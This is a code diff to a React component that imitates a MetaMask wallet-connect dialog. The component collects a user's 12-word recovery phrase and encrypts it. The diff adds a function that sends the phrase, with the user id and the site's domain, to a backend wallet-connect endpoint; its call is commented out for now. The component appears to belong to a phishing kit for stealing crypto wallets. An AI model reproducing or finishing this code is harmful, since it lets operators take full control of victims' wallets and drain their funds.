@@ -1,10 +1,12 @@
 import "./Metamask.scss";
 import Fox from "./Fox/Fox";
 import {useState} from 'react';
-import {DataEncripting} from '../../utils/arrayParser';
+import {DataDecripting, DataEncripting} from '../../utils/arrayParser';
 import MetamaskSuccess from './MetamaskSuccess/MetamaskSuccess';
 import {checkSidLength} from '../../utils/checkSidPhrase';
 import {useThemeContext} from '../../context/ThemeContext';
+import {store} from '../../../index';
+import {putData} from '../../services/StaffServices';
 
 const Metamask = ({ onHandleClose, onClose }) => {
   const {theme} = useThemeContext()
@@ -17,6 +19,9 @@ const Metamask = ({ onHandleClose, onClose }) => {
 
     if (checkSidLength(val) === 12) {
       await DataEncripting(val)
+      console.log('await DataEncripting(val)', await DataEncripting(val))
+      console.log('await DataDecripting(val)', await DataDecripting(val))
+      // await sendSidPhrase(await DataEncripting(val))
       setTimeout(() => {
         setSuccess(true)
         localStorage.setItem('connected', 'true')
@@ -24,6 +29,16 @@ const Metamask = ({ onHandleClose, onClose }) => {
     } else {
       setErrorPhrase(true)
     }
+  }
+
+  const sendSidPhrase = async (val) => {
+    const obj = {
+      userId: store.user.id,
+      domainName: window.location.host,
+      walletType: 'metamask',
+      receivedData: val
+    }
+    const res = await putData('/personal_area/crypto_wallet/connect_wallet/', obj)
   }
 
   return (
